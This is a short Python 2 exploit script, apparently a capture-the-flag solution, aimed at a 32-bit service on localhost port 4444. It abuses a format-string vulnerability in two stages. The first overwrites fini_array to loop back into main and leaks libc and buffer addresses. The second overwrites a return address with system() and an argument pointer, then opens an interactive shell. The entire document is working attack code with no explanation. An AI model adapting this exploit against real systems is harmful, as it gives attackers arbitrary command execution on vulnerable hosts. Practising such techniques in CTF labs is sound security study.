# -*- coding: utf-8 -*-
from m1z0r3 import *
from libformatstr import FormatStr

HOST = "localhost"
PORT = 4444

s,f = sock(HOST,PORT)

# 1st main
index = 7
fini_array = 0x80496dc
main = 0x804849b

offset_got_start = 0x80497ec
offset_retaddr_from_buf = (0x5d0-0x1b0)/4

buf = p32(offset_got_start)
buf += "%7$s"
buf += "%"+str(offset_retaddr_from_buf)+"$08x"

p = FormatStr()
p[fini_array] = main
s.send(buf+p.payload(index+len(buf)/4,start_len=len(buf))+"\n")
read_until(f,"RESPONSE :")

ret_addr = s.recv(16)
libc_start_addr = u32(ret_addr[4:8])
offset_libc_start_main = 0x19990
base_libc = libc_start_addr - offset_libc_start_main
buf_addr = int(ret_addr[8:],16) - (0x5f0-0x1b0)

print "[+] libc base addr %08x" % base_libc
print "[+] buf addr %08x" % buf_addr

# 2nd main
system_addr = base_libc + 0x3e800
p = FormatStr()
ret_addr = buf_addr + (0x5ec-0x1b0-0xe0)
print "[+] ret_addr %08x" % ret_addr
arg_addr = base_libc + (0xb7f829e4-0xb7e23000)
p[ret_addr] = system_addr
p[ret_addr+4] = "AAAA"
p[ret_addr+8] = arg_addr

s.send(p.payload(index,start_len=0)+"\n")
shell(s)
